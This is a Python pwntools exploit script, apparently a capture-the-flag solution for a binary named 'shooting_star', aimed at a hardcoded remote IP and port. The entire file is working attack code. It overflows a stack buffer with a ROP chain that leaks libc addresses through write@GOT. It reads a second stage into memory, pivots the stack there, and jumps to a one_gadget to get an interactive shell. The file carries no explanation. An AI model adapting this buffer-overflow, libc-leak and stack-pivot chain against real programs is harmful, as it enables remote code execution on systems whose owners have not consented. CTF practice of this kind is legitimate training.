#!/usr/bin/env python3


from pwn import *
from pwnc.pwnc import get_libc

BINARY = "./shooting_star"
LIBC = "./libc.so.6"
ADDR = "139.59.176.252"
PORT = 31216

splash()
elf = context.binary = ELF(BINARY)
libc = ELF(LIBC, checksec=False)


class Gadgets:
    pop_rdi_ret = 0x4012cb
    pop_rsi_pop_r15_ret = 0x4012c9
    pop_rsp_pop_r13_pop_r14_pop_r15_ret = 0x4012c5
    # one_gadget = 0x4f432
    one_gadget = 0xcbd1a
    ret = 0x401016


class Constants:
    second_stage = 0x404060


def conn():
    if args.LOCAL:
        pty = process.PTY
        return process(elf.path, stdin=pty, stdout=pty, stderr=pty)

    else:
        return remote(ADDR, PORT)


def solve() -> None:
    io = conn()

    input("PAUSE...")
    io.sendlineafter(b"> \x00", "1")
    payload = [
        cyclic(cyclic_find(0x616161616161616a, n=8), n=8),
        Gadgets.pop_rdi_ret,
        0x1,
        Gadgets.pop_rsi_pop_r15_ret,
        elf.got.write,
        0x0,
        elf.plt.write,
        Gadgets.pop_rdi_ret,
        0x0,
        Gadgets.pop_rsi_pop_r15_ret,
        Constants.second_stage,
        0x0,
        elf.plt.read,
        Gadgets.pop_rsp_pop_r13_pop_r14_pop_r15_ret,
        Constants.second_stage,
    ]
    io.sendline(flat(payload))
    io.recvuntil("May your wish come true!\n")

    write_leak = io.recvn(8)
    write_leak = u64(write_leak.ljust(8, b"\x00"))
    log.success(f"write found @: {hex(write_leak)}")
    read_leak = io.recvn(8)
    read_leak = u64(read_leak.ljust(8, b"\x00"))
    log.success(f"read found @: {hex(read_leak)}")
    setvbuf_leak = io.recvn(8)
    setvbuf_leak = u64(setvbuf_leak.ljust(8, b"\x00"))
    log.success(f"setvbuf found @: {hex(setvbuf_leak)}")
    libc.address = write_leak - libc.sym.write
    log.success(f"libc found @: {hex(libc.address)}")

    payload = [
        0x0,
        0x0,
        0x0,
        libc.address + Gadgets.one_gadget,
    ]
    io.sendline(flat(payload))
    io.interactive()


if __name__ == "__main__":
    solve()
